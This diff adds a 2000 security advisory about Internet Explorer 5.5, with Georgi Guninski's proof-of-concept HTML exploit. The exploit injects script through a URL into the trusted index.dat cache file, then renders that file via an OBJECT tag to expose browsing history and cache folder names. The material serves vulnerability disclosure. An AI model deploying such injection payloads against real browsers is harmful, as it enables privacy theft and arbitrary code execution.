@@ -1,0 +1,75 @@
+source: http://www.securityfocus.com/bid/1978/info
+
+
+IE 5.5 (and possibly other versions) stores recently visited URLs and cache folder names in a local file called index.dat. This file is kept in the following known locations:
+
+Windows 9x:
+C:/WINDOWS/Temporary Internet Files/Content.IE5/
+
+Windows 2000:
+C:/Documents and Settings/USERNAME/Local Settings/Temporary Internet Files/Content.IE5/
+
+This file will register as local content in IE's security mechanism, but arbitrary code can be written to it by including scripting commands in a URL. Therefore, although the code may not execute when the URL itself it visited, it will be trusted in the local index.dat file. To execute code in that file, it must be parsed by IE. Microsoft has released a security bulletin about parsing non-html files (see Microsoft Security Bulletin MS00-055 in the credit section), however it is still possible to force IE to render non-html files via an object tag defining the TYPE as text/html and specifying the file in the DATA field.
+
+Therefore, remote code can be injected into a trusted file and successfully executed. This vulnerability can be used for many purposes, including determining the names of the cache folders. With that information, an attacker could cause the target to execute files previously downloaded by the victim. 
+
+<HTML>
+<HEAD>
+<TITLE>
+OBJECT DATA="text/html" may allow executing arbitrary programs in IE 5.5
+</TITLE>
+</HEAD>
+<BODY>
+<H3>
+OBJECT DATA="text/html" may allow executing arbitrary programs in IE 5.5
+</H3>
+<BR>
+<p>Legal Notice:
+<br>This Advisory and Demonstration is Copyright (c) 2000 Georgi Guninski. You may distribute
+it unmodified. You may not modify it and distribute it or distribute parts
+of it without the author's written permission.
+<p>Disclaimer:
+<br>The opinions expressed in this advisory and program are my own and
+not of any company.
+<br>The usual standard disclaimer applies, especially the fact that Georgi
+Guninski
+<br>is not liable for any damages caused by direct or&nbsp; indirect use
+of the information or functionality provided by this advisory or program.
+<br>Georgi Guninski, bears no responsibility for content or misuse of this
+advisory or program or any derivatives thereof.
+<BR>
+<H4>
+This demo is for Windows 9x - you must modify the source for Win2K.
+<BR>
+You may need to wait a few minutes if you have slow computer. If you have Pentium 500 or better or use Win2K probably much less.
+It is expected a window with location "about:blank" to be opened containing index.dat - the file where the random names of temporary internet files directories are kept (they are random names in the beginning of the window) and the list of all visited URLs among other stuff.
+<BR>
+Once the temporary internet files directories are know it is possible to execute arbitrary programs thru cached files and showHelp() or OBJECT CODEBASE="...".
+<BR>
+<H3>
+If you don't see a window with location "about:blank" and content of index.dat close IE and visit the page again.
+</H3>
+</H4>
+<BR>
+Read the <A HREF="parsedat-desc.html">Advisory</A> for more information.
+<SCRIPT>
+b=window.open("http://www.guninski.com/empty2.html?<SCRIPT>a=window.open();a.document.body.innerHTML=escape(document.body.innerHTML)</"+"SCRIPT>");
+s='<OBJECT DATA="file://C:/WINDOWS/Temporary Internet Files/Content.IE5/index.dat" TYPE="text/html" WIDTH=200 HEIGHT=200></OBJECT>';
+//s='<OBJECT DATA="file://C:/Documents and Settings/Administrator/Local Settings/Temporary Internet Files/Content.IE5/index.dat" TYPE="text/html" WIDTH=200 HEIGHT=200></OBJECT>';
+// ^^^ This is for Win2K ------------you must change "Administrator" to the actual user name
+setTimeout("document.writeln(s)",5000);
+</SCRIPT>
+
+<center>(C) Copyright 2000 Georgi Guninski</center>
+<BR>
+<center>
+| <a href="http://www.guninski.com">Home</a> | 
+<a href="browsers.html">Internet Explorer</a> | 
+<a href="win2k.html">Windows 2000</a> | 
+<a href="exploit.html">AIX</a> | 
+<a href="netscape.html">Netscape</a> | 
+<a href="greets.html">Greets</a> | 
+<a href="index.html">More...</a> | 
+</center>
+</BODY>
+</HTML>
